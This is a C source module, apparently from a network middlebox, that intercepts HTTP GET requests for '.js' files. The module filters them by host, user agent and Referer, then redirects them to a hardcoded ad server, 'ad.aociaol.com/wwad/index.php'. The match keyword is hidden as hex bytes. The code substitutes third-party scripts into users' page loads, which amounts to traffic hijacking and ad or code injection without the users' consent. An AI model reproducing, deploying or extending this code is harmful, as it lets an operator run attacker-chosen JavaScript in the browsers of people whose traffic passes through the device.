#include <string.h>

#include "ha_debug.h"
#include "ha_network.h"
#include "ha_policy.h"
#include "ha_http_type.h"
#include "ha_search.h"
#include "ha_config.h"
#include "ha_30x.h"
#include "ha_adt.h"


#define DEF_REF_ENTRIES   1024
#define DEF_JS_SERVER  "ad.aociaol.com"
#define DEF_JS_PATH  "/wwad/index.php"

struct ha_jsref_entry {
	cstr_t host;
};

struct _ha_js_ctl {
        char server[DEF_SRV_MAXLEN]; /*服务器地址 */
        char path[DEF_URL_MAXLEN]; /*路径地址*/
        struct hash_table *refer;
		struct list_head h_head;
		struct list_head agent_head;
};

struct ha_js_ctl {
	/*weiwang js*/
	struct _ha_js_ctl wwjs;
	
	/*haishu  js*/
	struct _ha_js_ctl hsjs;
};

static struct ha_js_ctl hjs_ctl ={
};

/*计算hash*/
static uint ha_refer_js_hash(void *v)
{
	struct ha_jsref_entry *ventry = (struct ha_jsref_entry *)v;
	return str_hash(ventry->host.str, ventry->host.len);
}

/*比较 */
static int ha_refer_js_cmp(void *v1,void *v2)
{
	struct ha_jsref_entry* entry1 = (struct ha_jsref_entry *)v1;
	struct ha_jsref_entry* entry2 = (struct ha_jsref_entry *)v2;

	return (ha_strcmp(&entry1->host,entry2->host.str,entry2->host.len)) ? 0 : 1;
}

/*新的入口节点*/
static void *ha_refer_js_new(void *v)
{
	struct ha_jsref_entry *res = NULL;
	struct ha_jsref_entry *ventry = (struct ha_jsref_entry *)v;
	if (!ventry->host.str)
		return res;

	res = MALLOC(sizeof(*res) + ventry->host.len + 1);
	if (!res)
		return res;

	char *pos = (char *)(res + 1);
	cstr_fill(pos,&res->host,ventry->host.str,ventry->host.len);
	
	return res;
}

/*销毁 */
static void ha_refer_js_destroy(void *v)
{
	FREE(v);
}

/*key匹配*/
static char keyward[]={0x2e,0x6a,0x73,0};
static bool ha_js_key_guess(struct ha_http_request *req)
{	
	if (req->url.len <= 3)
        return false;

 	uint nlen = raw_search((const uchar *)keyward,3,
                                             (const uchar *)req->url.str,req->url.len,true);
 	if (UINT32_MAX == nlen) 
		return false;	

	if (nlen + 3 < req->url.len && isalnum(req->url.str[nlen + 3]))
		return false;	

	return true;
}

/*urls是否在列表中*/
static bool ha_js_urls_guess(cstr_t *host, struct list_head *lh)
{
	struct ha_string_entry *key;
	if (list_empty(lh))
		return true;
	
    list_for_each_entry(key,lh,next) {
        if (ha_strcmp(&key->content,host->str,host->len)) 
            return true;               
    }	
	return false;
}

/*ua是否在列表中 */
static bool ha_js_ua_guess(cstr_t *ua, struct list_head *lh)
{
	struct ha_string_entry *pos;
	if (list_empty(lh))
		return true;
	
	list_for_each_entry(pos,lh,next) {
		if (UINT32_MAX != raw_search((const u8 *)pos->content.str,pos->content.len,(const u8 *)ua->str,ua->len,true))
			return true;
	}
	return false;
}

/*
当浏览器向web服务器发送请求的时候，
一般会带上Referer，告诉服务器我是从哪个页面链接过来的
*/

static bool ha_js_refer_guess(struct ha_http_request *req, struct _ha_js_ctl *ctl)
{
	struct ha_jsref_entry ref;

	if(!req->refer || !ctl->refer)
		return false;
	
	char *ptr = strstr(req->refer->str, "http://");
	if (ptr){
		ptr += 7;
		ref.host.str = ptr;

		int len = req->refer->str + req->refer->len - ptr;
		int i = 0;
		for(i=0; i<len; i++)
			if(ptr[i] == '/')
				break;
		
		if (i <= len)
			ref.host.len = i;
		else
			return false;		
	}	
	return hash_table_find(ctl->refer, &ref, NULL, NULL);
}

/*这里是重新进行检测 */
static bool ha_js_checker(struct ha_http_request *req, struct _ha_js_ctl *ctl)
{
/*
	if (!ctl->refer)
		return false;
*/	
    if (!ha_js_key_guess(req))
		return false;   

	if (!ha_js_urls_guess(req->host, &ctl->h_head))
		return false;
	
	if(!ha_js_ua_guess(req->ua, &ctl->agent_head))
		return false;

	if(!ha_js_refer_guess(req, ctl))
		return false;

    return true;
}

#if 0
static bool ha_hs_js_handler(struct ha_http_request *req,int type,struct ha_packet_info *pi)
{
	struct _ha_js_ctl *ctl = &hjs_ctl.hsjs;
	if (type != HTTP_GET)
		return true;

	if (!ha_js_checker(req,ctl))
		return true;
			
	if (!ha_build_redir_args(req,req->ua,"js",pi,false))
		return true;

	ha_http_redirect(pi,"http",ctl->server,ctl->path,ha_escap_buffer_get(),true);
	return false;
}
#endif

static bool ha_ww_js_handler(struct ha_http_request *req,int type,struct ha_packet_info *pi)
{
	struct _ha_js_ctl *ctl = &hjs_ctl.wwjs;
	if (type != HTTP_GET)
		return true;

	if (!ha_js_checker(req, ctl))
		return true;
			
	if (!ha_build_redir_args(req,req->ua,"js",pi,false))
		return true;

	ha_http_redirect(pi,"http",ctl->server,ctl->path,ha_escap_buffer_get(),true);
	return false;
}

static void ha_js_refer_add(struct json_object *jo,void *v)
{
	assert(jo);
    const char *str = NULL;
    size_t len = 0;
	struct ha_jsref_entry entry;
    struct hash_table *h = (struct hash_table *)v;

    jo_array_string_check(jo,str,len,2);

    entry.host.str = str;
    entry.host.len = len;
    hash_table_add(h, &entry, NULL);
}

/*初始化 */
static void ha_js_urlua_add(struct json_object *jo,void *v)
{
	assert(jo);
    const char *str = NULL;
	size_t len = 0;
    jo_array_string_check(jo,str,len,2);

    struct ha_string_entry *entry = MALLOC(sizeof(*entry) + len + 1);
    if (!entry)
         return ;
    char *pos = entry->data;

    cstr_fill(pos,&entry->content,str,len);

    INIT_LIST_HEAD(&entry->next);

    struct list_head *lh = (struct list_head *)v;
    list_add_tail(&entry->next,lh);
}


/*这里是控制的初始化*/
static void ha_js_ctl_conf_init(struct _ha_js_ctl *ctl, char *name)
{
	INIT_LIST_HEAD(&ctl->agent_head);/*链表的头部初始化 */
	INIT_LIST_HEAD(&ctl->h_head);
	ctl->refer = NULL;
	
	struct json_object *jo = ha_find_module_config(name); /*对特定的模块进行查找*/
    if (!jo)
        return ;
	
	ctl->refer = hash_table_new(31, DEF_REF_ENTRIES,
									ha_refer_js_hash,
									ha_refer_js_cmp,
									ha_refer_js_new,
									ha_refer_js_destroy);
	assert(ctl->refer);
	
    const char *str = ha_json_get_string(jo,"server");
    if (str)
        strncpy(ctl->server,str,sizeof(ctl->server));
		
    str = ha_json_get_string(jo,"path");
    if (str && strlen(str) > 1)
        strncpy(ctl->path,str,sizeof(ctl->path)); 

    struct json_object *elt = NULL;
	if (jo && json_object_object_get_ex(jo,"agent",&elt) && elt)
		ha_json_array_handle(elt,ha_js_urlua_add,&ctl->agent_head);
		
	if (jo && json_object_object_get_ex(jo,"urls",&elt) && elt)
		ha_json_array_handle(elt,ha_js_urlua_add,&ctl->h_head);
		
	if (jo && json_object_object_get_ex(jo,"ignore-refer",&elt) && elt)
		ha_json_array_handle(elt,ha_js_refer_add,ctl->refer);
	
}

static void ha_js_conf_init()
{
	struct _ha_js_ctl *ctl = &hjs_ctl.wwjs;
	
    strncpy(ctl->server,DEF_JS_SERVER,sizeof(ctl->server));
    strncpy(ctl->path,DEF_JS_PATH,sizeof(ctl->path)); 
	ha_js_ctl_conf_init(ctl, "wwjs");


	ctl = &hjs_ctl.hsjs;
	strncpy(ctl->server,DEF_JS_SERVER,sizeof(ctl->server));
    strncpy(ctl->path,DEF_JS_PATH,sizeof(ctl->path));
	ha_js_ctl_conf_init(ctl, "hsjs");

}

void ha_js_init(void)
{
        struct ha_js_ctl *ctl = &hjs_ctl;    
		
        ha_js_conf_init();

		ignore_server(ctl->wwjs.server,strlen(ctl->wwjs.server));
		proto_pseudo_server_register(ctl->wwjs.server);
        ha_http_type_handler_register("wwjs_handler",ha_ww_js_handler);
#if 0		
		ignore_server(ctl->hsjs.server,strlen(ctl->hsjs.server));
		proto_pseudo_server_register(ctl->hsjs.server);
        ha_http_type_handler_register("hsjs_handler",ha_hs_js_handler);
#endif
}

void ha_js_destroy(void)
{
	struct _ha_js_ctl *ctl = &hjs_ctl.wwjs;
	struct ha_string_entry *a_pos,*a_next;
	
	list_for_each_entry_safe(a_pos,a_next,&ctl->h_head ,next){
		list_del(&a_pos->next);
		FREE(a_pos);
	}

	list_for_each_entry_safe(a_pos,a_next,&ctl->agent_head,next){
		list_del(&a_pos->next);
		FREE(a_pos);
	}
	
	if (ctl->refer) {
		hash_table_destroy(ctl->refer);
		ctl->refer = NULL;
	}	

	ctl = &hjs_ctl.hsjs;
	list_for_each_entry_safe(a_pos,a_next,&ctl->h_head ,next){
		list_del(&a_pos->next);
		FREE(a_pos);
	}

	list_for_each_entry_safe(a_pos,a_next,&ctl->agent_head,next){
		list_del(&a_pos->next);
		FREE(a_pos);
	}
	
	if (ctl->refer) {
		hash_table_destroy(ctl->refer);
		ctl->refer = NULL;
	}	
}
